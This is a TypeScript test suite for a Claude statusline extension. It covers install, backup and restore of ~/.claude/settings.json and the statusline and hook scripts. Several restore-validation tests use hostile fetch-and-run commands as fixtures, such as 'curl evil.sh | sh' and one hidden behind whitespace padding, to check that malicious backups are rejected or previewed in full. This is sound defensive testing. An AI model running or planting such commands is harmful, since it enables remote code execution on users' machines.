import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { spawnSync } from 'child_process';
import {
  runStatuslineSetup,
  runStatuslineRestore,
  prepareStatuslineRestore,
  isStatuslineConfigured,
  isClaudelikeStatuslineActive,
  statuslineBackupPath,
  STATUSLINE_FILENAME,
  BACKUP_FILENAME,
} from '../src/statusline';

const STATUSLINE_PATH = path.resolve(__dirname, '..', 'hooks', STATUSLINE_FILENAME);

describe('statusline module (install)', () => {
  let fakeHome: string;
  let originalHome: string | undefined;
  let originalUserProfile: string | undefined;
  let extensionPath: string;

  beforeEach(() => {
    fakeHome = fs.mkdtempSync(path.join(os.tmpdir(), 'statusline-test-home-'));
    extensionPath = fs.mkdtempSync(path.join(os.tmpdir(), 'statusline-test-ext-'));
    fs.mkdirSync(path.join(extensionPath, 'hooks'), { recursive: true });
    fs.writeFileSync(
      path.join(extensionPath, 'hooks', STATUSLINE_FILENAME),
      '#!/usr/bin/env node\nprocess.stdout.write("test statusline");\n',
    );
    originalHome = process.env.HOME;
    originalUserProfile = process.env.USERPROFILE;
    process.env.HOME = fakeHome;
    process.env.USERPROFILE = fakeHome;
  });

  afterEach(() => {
    if (originalHome === undefined) delete process.env.HOME;
    else process.env.HOME = originalHome;
    if (originalUserProfile === undefined) delete process.env.USERPROFILE;
    else process.env.USERPROFILE = originalUserProfile;
    fs.rmSync(fakeHome, { recursive: true, force: true });
    fs.rmSync(extensionPath, { recursive: true, force: true });
  });

  it('installs script and registers statusLine in fresh environment', async () => {
    const result = await runStatuslineSetup(extensionPath);
    expect(result.scriptInstalled).toBe(true);
    expect(result.settingsUpdated).toBe(true);

    const scriptPath = path.join(fakeHome, '.claude', 'hooks', STATUSLINE_FILENAME);
    expect(fs.existsSync(scriptPath)).toBe(true);

    const settings = JSON.parse(fs.readFileSync(path.join(fakeHome, '.claude', 'settings.json'), 'utf8'));
    expect(settings.statusLine?.type).toBe('command');
    expect(settings.statusLine?.command).toContain(STATUSLINE_FILENAME);
  });

  it('does NOT replace existing user statusline by default', async () => {
    const claudeDir = path.join(fakeHome, '.claude');
    fs.mkdirSync(claudeDir, { recursive: true });
    fs.writeFileSync(
      path.join(claudeDir, 'settings.json'),
      JSON.stringify({
        statusLine: {
          type: 'command',
          command: '~/.claude/my-custom-statusline.sh',
          padding: 0,
        },
      }),
    );

    const result = await runStatuslineSetup(extensionPath);
    // Script is copied (idempotent), but settings are untouched
    expect(result.scriptInstalled).toBe(true);
    expect(result.settingsUpdated).toBe(false);

    const settings = JSON.parse(fs.readFileSync(path.join(claudeDir, 'settings.json'), 'utf8'));
    expect(settings.statusLine?.command).toBe('~/.claude/my-custom-statusline.sh');
  });

  it('replaces existing statusline when force=true', async () => {
    const claudeDir = path.join(fakeHome, '.claude');
    fs.mkdirSync(claudeDir, { recursive: true });
    fs.writeFileSync(
      path.join(claudeDir, 'settings.json'),
      JSON.stringify({
        statusLine: { type: 'command', command: '~/.claude/my-custom-statusline.sh' },
      }),
    );

    const result = await runStatuslineSetup(extensionPath, true);
    expect(result.settingsUpdated).toBe(true);

    const settings = JSON.parse(fs.readFileSync(path.join(claudeDir, 'settings.json'), 'utf8'));
    expect(settings.statusLine?.command).toContain(STATUSLINE_FILENAME);
  });

  it('re-runs idempotently when Claudelike statusline is already registered', async () => {
    await runStatuslineSetup(extensionPath);
    const result = await runStatuslineSetup(extensionPath);
    // Second run: command still points at our statusline, settings get rewritten
    // but value is the same
    expect(result.scriptInstalled).toBe(true);
  });

  it('isStatuslineConfigured returns true only when statusLine.command is set', async () => {
    expect(isStatuslineConfigured()).toBe(false);
    await runStatuslineSetup(extensionPath);
    expect(isStatuslineConfigured()).toBe(true);
  });

  it('isClaudelikeStatuslineActive distinguishes our statusline from others', async () => {
    const claudeDir = path.join(fakeHome, '.claude');
    fs.mkdirSync(claudeDir, { recursive: true });
    fs.writeFileSync(
      path.join(claudeDir, 'settings.json'),
      JSON.stringify({ statusLine: { type: 'command', command: '~/.claude/other.sh' } }),
    );

    expect(isStatuslineConfigured()).toBe(true);
    expect(isClaudelikeStatuslineActive()).toBe(false);

    await runStatuslineSetup(extensionPath, true); // force replace
    expect(isClaudelikeStatuslineActive()).toBe(true);
  });

  it('preserves other settings keys when installing statusline', async () => {
    const claudeDir = path.join(fakeHome, '.claude');
    fs.mkdirSync(claudeDir, { recursive: true });
    fs.writeFileSync(
      path.join(claudeDir, 'settings.json'),
      JSON.stringify({ hooks: { PreToolUse: [{ matcher: '', hooks: [] }] }, someSetting: 'keep' }),
    );

    await runStatuslineSetup(extensionPath);
    const settings = JSON.parse(fs.readFileSync(path.join(claudeDir, 'settings.json'), 'utf8'));
    expect(settings.someSetting).toBe('keep');
    expect(Array.isArray(settings.hooks?.PreToolUse)).toBe(true);
  });

  it('leaves no .tmp files behind after install', async () => {
    await runStatuslineSetup(extensionPath);
    const files = fs.readdirSync(path.join(fakeHome, '.claude'));
    expect(files.filter(f => f.includes('.tmp'))).toHaveLength(0);
  });

  it('throws clearly when bundled script is missing', async () => {
    fs.rmSync(path.join(extensionPath, 'hooks'), { recursive: true });
    await expect(runStatuslineSetup(extensionPath)).rejects.toThrow(/not found/);
  });
});

describe('statusline backup + restore flow', () => {
  let fakeHome: string;
  let originalHome: string | undefined;
  let originalUserProfile: string | undefined;
  let extensionPath: string;

  beforeEach(() => {
    fakeHome = fs.mkdtempSync(path.join(os.tmpdir(), 'statusline-backup-home-'));
    extensionPath = fs.mkdtempSync(path.join(os.tmpdir(), 'statusline-backup-ext-'));
    fs.mkdirSync(path.join(extensionPath, 'hooks'), { recursive: true });
    fs.writeFileSync(
      path.join(extensionPath, 'hooks', STATUSLINE_FILENAME),
      '#!/usr/bin/env node\n',
    );
    originalHome = process.env.HOME;
    originalUserProfile = process.env.USERPROFILE;
    process.env.HOME = fakeHome;
    process.env.USERPROFILE = fakeHome;
  });

  afterEach(() => {
    if (originalHome === undefined) delete process.env.HOME;
    else process.env.HOME = originalHome;
    if (originalUserProfile === undefined) delete process.env.USERPROFILE;
    else process.env.USERPROFILE = originalUserProfile;
    fs.rmSync(fakeHome, { recursive: true, force: true });
    fs.rmSync(extensionPath, { recursive: true, force: true });
  });

  function writeSettings(obj: unknown): void {
    const dir = path.join(fakeHome, '.claude');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'settings.json'), JSON.stringify(obj, null, 2));
  }

  function readSettings(): any {
    return JSON.parse(fs.readFileSync(path.join(fakeHome, '.claude', 'settings.json'), 'utf8'));
  }

  it('writes a backup when force-replacing an existing foreign statusline', async () => {
    writeSettings({
      statusLine: { type: 'command', command: '/path/to/my-existing.sh', padding: 2 },
    });

    const result = await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
    expect(result.settingsUpdated).toBe(true);
    expect(result.backupPath).toBe(statuslineBackupPath());

    const backup = JSON.parse(fs.readFileSync(statuslineBackupPath(), 'utf8'));
    expect(backup.previous_statusLine.command).toBe('/path/to/my-existing.sh');
    expect(backup.previous_statusLine.padding).toBe(2);
    expect(backup.backed_up_by_version).toBe('0.9.2');
    expect(typeof backup.backed_up_at).toBe('string');
    expect(typeof backup.note).toBe('string');
    expect(backup.note).toMatch(/Restore Previous Statusline|~\/\.claude\/settings\.json/);
  });

  it('uses a self-describing backup filename that a human/Claude can find', async () => {
    writeSettings({ statusLine: { type: 'command', command: 'x' } });
    await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
    const p = statuslineBackupPath();
    expect(p).toContain(BACKUP_FILENAME);
    expect(p).toContain('.claude');
  });

  it('does NOT write a backup when the prior statusline was already Claudelike', async () => {
    // First install — no prior foreign statusline, no backup.
    await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
    expect(fs.existsSync(statuslineBackupPath())).toBe(false);

    // Second install (e.g. re-run) — current statusLine is ours, no backup.
    const second = await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
    expect(second.backupPath).toBeUndefined();
    expect(fs.existsSync(statuslineBackupPath())).toBe(false);
  });

  it('does NOT write a backup when there is no prior statusline at all', async () => {
    writeSettings({ someOtherKey: true });
    const result = await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
    expect(result.backupPath).toBeUndefined();
    expect(fs.existsSync(statuslineBackupPath())).toBe(false);
  });

  it('never overwrites a prior backup — rotates to .1, .2, …', async () => {
    // First replacement
    writeSettings({ statusLine: { type: 'command', command: 'first-statusline.sh' } });
    const first = await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
    expect(first.backupPath).toBe(statuslineBackupPath());

    // User re-registers a different foreign statusline without running restore,
    // then we install again.
    writeSettings({ statusLine: { type: 'command', command: 'second-statusline.sh' } });
    const second = await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
    expect(second.backupPath).toBe(`${statuslineBackupPath()}.1`);

    // Both backups preserved with the right contents.
    const b1 = JSON.parse(fs.readFileSync(statuslineBackupPath(), 'utf8'));
    const b2 = JSON.parse(fs.readFileSync(`${statuslineBackupPath()}.1`, 'utf8'));
    expect(b1.previous_statusLine.command).toBe('first-statusline.sh');
    expect(b2.previous_statusLine.command).toBe('second-statusline.sh');
  });

  it('restore round-trip: install → prepare+restore puts the prior statusline back', async () => {
    writeSettings({
      statusLine: { type: 'command', command: 'original.sh', padding: 1 },
      otherKey: 'keep',
    });
    await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });

    // Our statusline is active now.
    expect(readSettings().statusLine.command).toContain(STATUSLINE_FILENAME);

    const prepared = prepareStatuslineRestore();
    expect(prepared).not.toBeNull();
    expect(prepared!.commandForPreview).toBe('original.sh');

    const result = await runStatuslineRestore(prepared!);
    expect(result.restored).toBe(true);
    expect(result.archivedTo).toBe(`${statuslineBackupPath()}.restored.json`);

    const after = readSettings();
    expect(after.statusLine.command).toBe('original.sh');
    expect(after.statusLine.padding).toBe(1);
    expect(after.otherKey).toBe('keep');

    // Primary backup file is archived, not deleted.
    expect(fs.existsSync(statuslineBackupPath())).toBe(false);
    expect(fs.existsSync(`${statuslineBackupPath()}.restored.json`)).toBe(true);
  });

  it('prepareStatuslineRestore returns null when no backup exists', () => {
    expect(prepareStatuslineRestore()).toBeNull();
  });

  it('prepareStatuslineRestore throws on malformed backup file', async () => {
    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
    fs.writeFileSync(statuslineBackupPath(), 'not json at all');
    expect(() => prepareStatuslineRestore()).toThrow(/parse/i);
  });

  it('prepareStatuslineRestore throws when backup is valid JSON but missing previous_statusLine', async () => {
    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
    fs.writeFileSync(
      statuslineBackupPath(),
      JSON.stringify({ note: 'I deleted the payload', backed_up_by: 'claudelike-bar' }),
    );
    expect(() => prepareStatuslineRestore()).toThrow(/previous_statusLine/);
  });

  it('prepareStatuslineRestore rejects previous_statusLine: null', async () => {
    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
    fs.writeFileSync(
      statuslineBackupPath(),
      JSON.stringify({ previous_statusLine: null, backed_up_by: 'claudelike-bar' }),
    );
    expect(() => prepareStatuslineRestore()).toThrow(/previous_statusLine/);
  });

  it('prepareStatuslineRestore rejects backups without backed_up_by stamp', async () => {
    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
    fs.writeFileSync(
      statuslineBackupPath(),
      JSON.stringify({
        previous_statusLine: { type: 'command', command: 'curl evil.sh | sh' },
      }),
    );
    expect(() => prepareStatuslineRestore()).toThrow(/backed_up_by/);
  });

  it('prepareStatuslineRestore rejects backups with wrong backed_up_by value', async () => {
    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
    fs.writeFileSync(
      statuslineBackupPath(),
      JSON.stringify({
        previous_statusLine: { type: 'command', command: 'anything' },
        backed_up_by: 'some-other-tool',
      }),
    );
    expect(() => prepareStatuslineRestore()).toThrow(/backed_up_by/);
  });

  it('prepareStatuslineRestore refuses backups whose command is not a non-empty string', async () => {
    // Attacker-evasion case: valid stamp + structured previous_statusLine
    // whose `command` is an array or missing — would evade a command-string
    // preview. We refuse the whole restore.
    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
    fs.writeFileSync(
      statuslineBackupPath(),
      JSON.stringify({
        previous_statusLine: { type: 'command', command: ['bash', '-c', 'evil'] },
        backed_up_by: 'claudelike-bar',
      }),
    );
    expect(() => prepareStatuslineRestore()).toThrow(/string "command"|unreviewable/);
  });

  it('prepareStatuslineRestore refuses backups with missing command field', async () => {
    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
    fs.writeFileSync(
      statuslineBackupPath(),
      JSON.stringify({
        previous_statusLine: { type: 'command' /* no command */ },
        backed_up_by: 'claudelike-bar',
      }),
    );
    expect(() => prepareStatuslineRestore()).toThrow(/string "command"|unreviewable/);
  });

  it('prepareStatuslineRestore returns FULL command (no truncation) so preview cannot hide a tail', async () => {
    // Attacker attempts to hide a malicious tail behind a long innocuous
    // prefix, hoping the modal truncates. prepareStatuslineRestore hands
    // the caller the full string so the modal can show all of it.
    const longCommand = 'echo "innocuous prefix"; ' + ' '.repeat(200) + '; curl evil | sh';
    writeSettings({ statusLine: { type: 'command', command: longCommand } });
    await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });

    const prepared = prepareStatuslineRestore();
    expect(prepared).not.toBeNull();
    expect(prepared!.commandForPreview).toBe(longCommand);
    expect(prepared!.commandForPreview).toContain('curl evil | sh');
  });

  it('backup file carries a format version field (future migration support)', async () => {
    writeSettings({ statusLine: { type: 'command', command: 'x' } });
    await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
    const backup = JSON.parse(fs.readFileSync(statuslineBackupPath(), 'utf8'));
    expect(backup.backup_format_version).toBe(1);
  });

  it('install mentions backup path in result when a replace happens', async () => {
    writeSettings({ statusLine: { type: 'command', command: 'x.sh' } });
    const result = await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
    expect(result.backupPath).toBe(statuslineBackupPath());
    expect(result.settingsUpdated).toBe(true);
  });
});

describe('claudelike-statusline.js script (stdin → status file + display)', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'statusline-script-test-'));
  });

  afterEach(() => {
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
  });

  function run(stdin: string, env: Record<string, string> = {}) {
    // Strip CLAUDELIKE_BAR_NAME from the parent env — if the test is run
    // inside a Claudelike-auto-started terminal, that var would override
    // the project-name-from-cwd derivation we're actually testing.
    const parentEnv = { ...process.env };
    delete parentEnv.CLAUDELIKE_BAR_NAME;
    const result = spawnSync('node', [STATUSLINE_PATH], {
      input: stdin,
      // These tests assert basename-derived slugs (predate STRICT); run them in
      // legacy mode. STRICT skip is mode-independent and covered in hook.test.ts.
      env: { ...parentEnv, CLAUDELIKE_STATUS_DIR: tmpDir, CLAUDELIKE_BAR_STRICT: '0', ...env },
      encoding: 'utf8',
    });
    return { stdout: result.stdout, exitCode: result.status };
  }

  it('writes context_percent to status file', () => {
    const stdin = JSON.stringify({
      workspace: { current_dir: path.join(tmpDir, 'my-app') },
      context_window: { used_percentage: 42.7 },
    });
    run(stdin);
    const statusFile = path.join(tmpDir, 'my-app.json');
    expect(fs.existsSync(statusFile)).toBe(true);
    const data = JSON.parse(fs.readFileSync(statusFile, 'utf8'));
    expect(data.context_percent).toBe(42);
    expect(data.project).toBe('my-app');
  });

  it('STRICT (default): writes no status file for an unregistered cwd but still prints the line', () => {
    const stdin = JSON.stringify({
      model: { display_name: 'Claude Opus 4.8' },
      workspace: { current_dir: path.join(tmpDir, 'unregistered') },
      context_window: { used_percentage: 30 },
    });
    const { stdout } = run(stdin, { CLAUDELIKE_BAR_STRICT: '1' });
    // No junk context file minted under STRICT...
    expect(fs.readdirSync(tmpDir).filter((f) => f.endsWith('.json'))).toHaveLength(0);
    // ...but the status line still renders (model + ctx, no project).
    expect(stdout).toContain('Claude Opus 4.8');
    expect(stdout).toContain('ctx 30%');
  });

  it('outputs a minimal display line including context %', () => {
    const stdin = JSON.stringify({
      model: { display_name: 'Claude Opus 4.6' },
      workspace: { current_dir: path.join(tmpDir, 'my-app') },
      context_window: { used_percentage: 42 },
    });
    const { stdout } = run(stdin);
    expect(stdout).toContain('Claude Opus 4.6');
    expect(stdout).toContain('my-app');
    expect(stdout).toContain('ctx 42%');
  });

  it('merges context_percent into existing status file (preserves status)', () => {
    // Pre-seed status file from a hook event
    const projectDir = path.join(tmpDir, 'my-app');
    const statusFile = path.join(tmpDir, 'my-app.json');
    fs.writeFileSync(statusFile, JSON.stringify({
      project: 'my-app',
      status: 'working',
      timestamp: 1000,
      event: 'PreToolUse',
    }));

    const stdin = JSON.stringify({
      workspace: { current_dir: projectDir },
      context_window: { used_percentage: 55 },
    });
    run(stdin);

    const data = JSON.parse(fs.readFileSync(statusFile, 'utf8'));
    expect(data.status).toBe('working'); // preserved
    expect(data.event).toBe('PreToolUse'); // preserved
    expect(data.context_percent).toBe(55); // added
  });

  it('omits context_percent entirely when payload lacks context_window', () => {
    const stdin = JSON.stringify({
      workspace: { current_dir: path.join(tmpDir, 'my-app') },
    });
    run(stdin);
    const data = JSON.parse(fs.readFileSync(path.join(tmpDir, 'my-app.json'), 'utf8'));
    // No context_percent field written — prevents clobbering a prior good value
    expect(data.context_percent).toBeUndefined();
  });

  it('handles malformed JSON gracefully (exits 0, writes default)', () => {
    const { exitCode } = run('not-json');
    expect(exitCode).toBe(0);
  });

  it('clamps out-of-range context percentages to [0, 100]', () => {
    const stdin = JSON.stringify({
      workspace: { current_dir: path.join(tmpDir, 'my-app') },
      context_window: { used_percentage: 250 },
    });
    run(stdin);
    const data = JSON.parse(fs.readFileSync(path.join(tmpDir, 'my-app.json'), 'utf8'));
    expect(data.context_percent).toBeLessThanOrEqual(100);
  });

  it('honors CLAUDELIKE_BAR_NAME env override for project name', () => {
    const stdin = JSON.stringify({
      workspace: { current_dir: path.join(tmpDir, 'different-name') },
      context_window: { used_percentage: 30 },
    });
    run(stdin, { CLAUDELIKE_BAR_NAME: 'explicit' });
    expect(fs.existsSync(path.join(tmpDir, 'explicit.json'))).toBe(true);
  });

  it('does NOT overwrite existing context_percent when input has no context_window', () => {
    // Pre-seed status file with a valid context %
    const statusFile = path.join(tmpDir, 'my-app.json');
    fs.writeFileSync(statusFile, JSON.stringify({
      project: 'my-app',
      status: 'working',
      timestamp: 1000,
      context_percent: 73,
    }));

    // Run statusline with payload lacking context_window
    const stdin = JSON.stringify({ workspace: { current_dir: path.join(tmpDir, 'my-app') } });
    run(stdin);

    const data = JSON.parse(fs.readFileSync(statusFile, 'utf8'));
    expect(data.context_percent).toBe(73); // preserved, NOT reset to 0
  });

  it('does NOT write context_percent on empty stdin', () => {
    const statusFile = path.join(tmpDir, 'my-app.json');
    fs.writeFileSync(statusFile, JSON.stringify({
      project: 'my-app',
      context_percent: 88,
    }));

    // No stdin at all — statusline should not mutate context_percent
    spawnSync('node', [STATUSLINE_PATH], {
      env: { ...process.env, CLAUDELIKE_STATUS_DIR: tmpDir, CLAUDELIKE_BAR_NAME: 'my-app' },
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe'],
    });

    const data = JSON.parse(fs.readFileSync(statusFile, 'utf8'));
    expect(data.context_percent).toBe(88);
  });

  it('omits "ctx N%" from display output when context is unavailable', () => {
    const stdin = JSON.stringify({
      model: { display_name: 'Claude' },
      workspace: { current_dir: path.join(tmpDir, 'my-app') },
    });
    const { stdout } = run(stdin);
    expect(stdout).not.toContain('ctx 0%');
    expect(stdout).not.toContain('ctx');
    expect(stdout).toContain('Claude');
  });
});

describe('dashboard-status.js hook (context_percent preservation)', () => {
  const HOOK_PATH = path.resolve(__dirname, '..', 'hooks', 'dashboard-status.js');
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'hook-preserve-test-'));
  });

  afterEach(() => {
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
  });

  it('preserves context_percent written by statusline when hook fires', () => {
    // Simulate: statusline wrote context_percent, then hook fires
    const statusFile = path.join(tmpDir, 'my-project.json');
    fs.writeFileSync(statusFile, JSON.stringify({
      project: 'my-project',
      status: 'ready',
      timestamp: 1000,
      event: 'Stop',
      context_percent: 42,
    }));

    // Hook fires for a new event
    const stdin = JSON.stringify({
      hook_event_name: 'PreToolUse',
      cwd: path.join(tmpDir, 'my-project'),
    });
    // See run() comment above — strip CLAUDELIKE_BAR_NAME so the outer
    // devcontainer terminal doesn't override project-from-cwd.
    const parentEnv = { ...process.env };
    delete parentEnv.CLAUDELIKE_BAR_NAME;
    spawnSync('node', [HOOK_PATH], {
      input: stdin,
      env: { ...parentEnv, CLAUDELIKE_STATUS_DIR: tmpDir, CLAUDELIKE_BAR_STRICT: '0' },
      encoding: 'utf8',
    });

    const data = JSON.parse(fs.readFileSync(statusFile, 'utf8'));
    // Hook owns status/event/timestamp — those update
    expect(data.status).toBe('working');
    expect(data.event).toBe('PreToolUse');
    // Hook does NOT own context_percent — that survives
    expect(data.context_percent).toBe(42);
  });
});
